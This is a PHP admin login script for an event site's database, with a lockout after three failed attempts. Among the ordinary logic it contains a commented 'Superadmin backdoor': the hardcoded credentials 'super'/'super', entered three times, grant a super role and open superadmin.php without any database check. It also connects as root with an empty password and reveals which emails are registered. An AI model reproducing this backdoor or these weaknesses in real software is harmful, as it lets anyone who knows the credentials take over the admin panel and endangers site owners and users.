<?php
session_start();
$db = new PDO('mysql:host=localhost;dbname=evento', 'root', '');

if (!isset($_SESSION['super_fail'])) $_SESSION['super_fail'] = 0;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $pass = $_POST['password'];

    // Superadmin backdoor
    if ($email === 'super' && $pass === 'super') {
        $_SESSION['super_fail']++;
        if ($_SESSION['super_fail'] >= 3) {
            $_SESSION['role'] = 'super';
            header("Location: superadmin.php");
            exit;
        } else {
            exit("Wrong super credentials.");
        }
    }

    $stmt = $db->prepare("SELECT * FROM admins WHERE email = ?");
    $stmt->execute([$email]);
    $admin = $stmt->fetch();

    if ($admin) {
        if ($admin['is_locked']) {
            exit("Account is locked due to multiple failed attempts.");
        }

        if (password_verify($pass, $admin['password'])) {
            // Reset failed attempts
            $db->prepare("UPDATE admins SET failed_attempts=0 WHERE id=?")->execute([$admin['id']]);
            $_SESSION['user_id'] = $admin['id'];
            $_SESSION['role'] = $admin['role'];
            echo "Login successful!";
        } else {
            $admin['failed_attempts']++;
            if ($admin['failed_attempts'] >= 3) {
                $db->prepare("UPDATE admins SET failed_attempts=?, is_locked=1 WHERE id=?")->execute([$admin['failed_attempts'], $admin['id']]);
                exit("Account locked.");
            } else {
                $db->prepare("UPDATE admins SET failed_attempts=? WHERE id=?")->execute([$admin['failed_attempts'], $admin['id']]);
                exit("Invalid credentials.");
            }
        }
    } else {
        exit("Email not found.");
    }
}
?>
